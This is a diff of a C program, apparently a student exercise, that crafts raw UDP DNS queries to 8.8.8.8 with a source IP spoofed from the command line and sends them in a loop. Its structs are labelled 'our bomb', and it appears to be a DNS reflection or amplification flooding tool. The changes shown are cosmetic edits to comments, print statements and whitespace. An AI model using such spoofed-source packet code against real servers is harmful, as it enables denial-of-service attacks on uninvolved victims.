@@ -11,7 +11,7 @@
 #include <netinet/udp.h>
 
 
-/* Define settings */
+/* Definition */
 #define DNS_Server "8.8.8.8"
 #define DOMAIN      "www.nctu.edu.tw"
 
@@ -55,7 +55,6 @@ typedef struct{
     unsigned short datalength;
 } DNS_opt;
 
-/* our bomb */
 typedef struct {
     int one;
     int sock;
@@ -204,7 +203,7 @@ Trash *DNS_Request(Trash *a)
 
     qname = &a->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
         sizeof(DNS_header)];
-    
+
     DNS_Format(qname, DOMAIN);
 
     a->query = (DNS_query *) &a->packet[sizeof(struct iphdr) + 
@@ -274,12 +273,12 @@ int main(int argc, char **argv)
     int a = 0;
     unsigned int i = 0;
 
-    printf("%s\n", argv[1]);
+    printf("argv[1]: %s\n", argv[1]);
 
     spoof_address = argv[1];
     spoof_ip = atoi(argv[2]);
 
-    printf("%s\n", spoof_address);
+    printf("spoof_address: %s\n", spoof_address);
 
     for (i = 0; i < 10; i++) {
         Implement(a);
